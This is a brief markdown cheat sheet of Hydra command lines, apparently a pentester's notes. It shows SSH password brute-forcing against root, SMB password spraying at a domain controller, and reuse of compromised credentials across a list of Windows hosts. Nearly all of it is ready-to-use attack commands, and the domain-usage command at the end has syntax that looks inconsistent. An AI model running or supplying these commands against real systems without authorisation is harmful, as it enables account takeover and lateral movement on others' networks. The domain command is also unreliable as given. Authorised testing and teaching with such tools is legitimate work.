# Hydra Examples

Single user, multiple passwords targeting SSH on port 2222:
```
hydra -l root -P passwords.txt ssh://1.2.3.4:2222
```
Spray targeting SMB on default port with a single thread:
```
hydra -L users.txt -p password1 -t 1 smb://dc01.domain.local
```
Try a specific username and password across the network:
```
hydra -l bwayne -p P@ssw0rd1! -M windows-hosts.txt smb2
```
Use previously compromised credentials across the network:
```
hydra -C creds.txt -M windows-hosts.txt smb2
```

## Domain Usage

For domain users, target the domain. In order for this attack to work, the domain MUST be specified and the curly braces ``{}`` are required. Additionally, eventhough it is a Domain the option requires ``workgroup:{DOMAINGOESHERE}``

``hydra -C creds.txt -m dc01 smb2 -m workgroup:{DOMAINGOESHERE}``
